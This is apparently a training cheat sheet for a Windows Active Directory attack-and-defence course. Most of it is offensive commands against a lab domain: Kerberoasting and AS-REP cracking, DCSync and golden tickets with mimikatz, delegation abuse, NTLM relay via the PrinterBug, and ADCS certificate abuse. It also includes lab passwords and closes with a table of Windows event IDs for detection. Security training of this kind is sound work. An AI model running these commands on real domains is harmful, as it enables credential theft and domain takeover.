title: Windows Attacks & Defense
html:
Windows Attacks & Defense

Used to perform the Kerberoast attack and save output to a file.

.\Rubeus.exe kerberoast /outfile:spn.txt

Uses hashcat to crack Keberoastable TGS tickets.

hashcat -m 13100 -a 0 spn.txt passwords.txt

Uses John the Ripper to crack TGS tickets, and outputs to results.pot.

sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot

Asreproasting

Used to perform the Asreproast attack and save the extracted tickets to a file.

.\Rubeus.exe asreproast /outfile:asrep.txt

Uses hashcat to crack AS-REP hashes that were saved in a file.

hashcat -m 18200 -a 0 asrep.txt passwords.txt --force

GPP Passwords

Used to import the Get-GPPPassword.ps1 script into the current powershell session.

Import-Module .\Get-GPPPassword.ps1

Cmdlet to automatically parse all XML files in the Policies folder in SYSVOL.

Get-GPPPassword

Used to bypass powershell script execution policy.

Set-ExecutionPolicy Unrestricted -Scope CurrentUser

Credentials in Shares

Used to load the PowerView.ps1 module into memory

Import-Module .\PowerView.ps1

PowerShell cmdlet used to identify shares in a domain

Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess

Forces a search within the current directory + subdirectories for the .ps1 file containing the string "eagle"

findstr /m /s /i "eagle" *.ps1

Credentials in Object Properties

Script to look for specific terms in the Description and Info fields of an AD object

.\SearchUser.ps1 -Terms pass

DCSync

Start a new instance of cmd.exe as the user eagle\rocky.

runas /user:eagle\rocky cmd.exe

Tool used to implement the DCsync attack

mimikatz.exe

Command used in mimikatz to DCSync and dump the Administrator password hash

lsadump::dcsync /domain:eagle.local /user:Administrator

Golden Ticket

Command used in mimikatz to DCSync and dump the krbtgt password hash

lsadump::dcsync /domain:eagle.local /user:krbtgt

Cmdlet from PowerView used to obtain the SID value of the domain.

Get-DomainSID

Command used in mimikatz to forge a golden ticket for the Administrator account and pass the ticket to the current session

golden /domain:eagle.local /sid:<domain sid> /rc4:<rc4 hash> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

Command line utility in Windows to display the contents of the Kerberos ticket cache.

klist

Kerberos Constrained Delegation

Cmdlet used to enumerate user accounts that are trusted for delegation in the domain

Get-NetUser -TrustedToAuth

Converts the plaintext password Slavi123 to its NTLM hash equivalent

.\Rubeus.exe hash /password:Slavi123

Using Rubeus to request a ticket for the Administrator account, by way of the webservice user who is trusted for delegation

.\Rubeus.exe s4u /user:webservice /rc4:<hash> /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt

Used to enter a new powershell remote session on the dc1 computer

Enter-PSSession dc1

Print Spooler & NTLM Relaying

Used to forward any connections to DC2 and attempt to perform DCsync attack

impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support

Used to trigger the PrinterBug

python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123

Registry key that can be disabled to prevent the PrinterBug

RegisterSpoolerRemoteRpcEndPoint

Coercing Attacks & Unconstrained Delegation

select samaccountname`

`Get-NetComputer -Unconstrained \

Used to monitor new logons and extract TGTs.

.\Rubeus.exe monitor /interval:1

Used to perform a coercing attack towards DC1, forcing it to connect to WS001.

Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local

Uses Mimikatz to perform a dcsync attack from a Windows-based host.

mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<domain-name>\administrator

Object ACLs

Removing the http/ws001 SPN from the anni user.

setspn -D http/ws001 anni

Setting a new SPN, ldap/ws001, on the anni user.

setspn -U -s ldap/ws001 anni

Setting a new SPN, ldap/server02, on the server01 machine.

`setspn -S ldap/server02` server01

PKI - ESC1

Using the Certify.exe tool to scan for vulnerabilities in PKI infrastructure.

.\Certify.exe find /vulnerable

Using the Certify.exe tool to obtain a certifcate from the vulnerable template

.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

Command to convert a PEM certificate to a PFX certificate.

openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Using the Rubeus.exe tool to request a TGT for the domain Administrator by way of forged certifcate.

.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt

Start a new instance as powershell as the htb-student user.

runas /user:eagle\htb-student powershell

Start a new remote powershell session on the PKI machine.

New-PSSession PKI

Enter a remote powershell session on the PKI machine.

Enter-PSSession PKI

Using the Get-WinEvent cmdlet to view windows Event 4887

Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}

Command used to save the events into an array

$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}

Format-List -Property *`

`$events[0] \

PKI & Coercing - ESC8

Command to forward incoming connections to the CA. The --adcs switch makes the tool parse and display the certificate if one is received.

impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs

Using the PrinterBug to trigger a connection back to the attacker.

python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123

Connecting to WS001 from the Kali host using RDP.

xfreerdp /u:bob /p:Slavi123 /v:172.16.18.25 /dynamic-resolution

Using Rubeus.exe to ask for a TGT by way of base 64 encoded certificate.

.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<b64 encoded cert>

Using mimikatz.exe to DCsync the administrator user. This is performed once the TGT for DC2 has been passed to the current session.

mimikatz.exe "lsadump::dcsync /user:Administrator" exit

Connecting to PKI from the Kali Host using evil-winrm.

evil-winrm -i 172.16.18.15 -u htb-student -p 'HTB_@cademy_stdnt!'

Windows Events

Description

Event ID

Event generated when a TGS is requested. Can be indicative of Kerberoasting.

4769

Event generated when a TGT is requested. Can be indicative of Asreproasting.

4768

Event generated when an account fails to log on.

4625

Event generated by a Kerberos pre-authentication failure.

4771

Event generated when attempting to validate the credentials of an account.

4776

Event generated when a GPO is modified, if Directory Service Changes auditing is enabled.

5136

Event generated when a user account is disabled.

4725

Event generated when an account successfully logs on to a windows computer. The S4U extension notes the presence of delegation.

4624

Event generated by a possible DCsync attack. If the account name is not a domain controller, it serves as a flag that a user generated the attack.

4662

Event generated when a user account is changed. Any association of this event with a honeypot user should trigger an alert.

4738

Event generated when a computer account is changed.

4742

Event generated when a certificate is requested.

4886

Event generated when a certificate is approved and issued.

4887
